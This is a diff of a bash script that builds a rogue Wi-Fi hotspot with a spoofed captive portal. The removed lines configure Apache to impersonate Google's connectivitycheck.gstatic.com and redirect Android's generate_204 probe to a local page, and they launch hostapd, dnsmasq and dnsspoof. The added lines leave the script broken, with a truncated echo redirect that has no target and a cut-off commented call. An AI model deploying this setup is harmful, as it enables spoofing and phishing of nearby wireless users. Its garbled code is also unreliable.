@@ -144,46 +144,18 @@ function addtoweb(){
 function android_conf(){
 	if [[ -f /etc/apache2/sites-enabled/android.conf ]];
 	then
-		echo "file found"
+		echo "File found"
+		return
 	else
 		touch /etc/apache2/sites-enabled/android.conf;
-		echo -e "<VirtualHost *:80>" >> /etc/apache2/sites-enabled/android.conf
-		echo -e "Servername connectivitycheck.gstatic.com" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "ServerAdmin webmaster@localhost" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "DocumentRoot /var/www/html/android" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "RedirectMatch 302 /generate_204 /index.html" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "ErrorLog\${APACHE_LOG_DIR}/android_error.log" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "CustomLog\${APACHE_LOG_DIR}/android_access.log combined" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "</VirtualHost>" >> /etc/apache2/sites-enabled/android.conf 
-		sleep 2;
-		echo -e "Configuration files are set";
-		read -p "Enter to continue";
+		echo -e "<VirtualHost *:80>" >> 
 	fi
 }
 
-
-function final_conf(){
-	#disconnect from network
-	tput reset
-	echo -e "Attempting to disconnect from the network";
-	sudo nmcli d disconnect wlan0;
-	sleep 2;
-	xterm -e /bin/bash -l -c "hostapd hostapd.conf";
-	sudo ifconfig wlan0 10.0.0.1;
-	xterm -e /bin/bash -l -c "dnsmasq -C dnsmasq.conf -d";
-	echo 0 > /proc/sys/net/ipv4/ip_forward;
-	service apache2 restart;
-	xterm -e /bin/bash -l -c "dnsspoof -i wlan0";	
-	   
-}
-
-
-
-find_interface;
+#find_interface;
 echo "The selected interface is ${interface}"
-get_ssid;
-hostapd_conf;
-dnsmasq_conf;
-addtoweb;
+#get_ssid;
+#hostapd_conf;
+#dnsmasq_conf;
+#addto
 android_conf;
-final_conf;
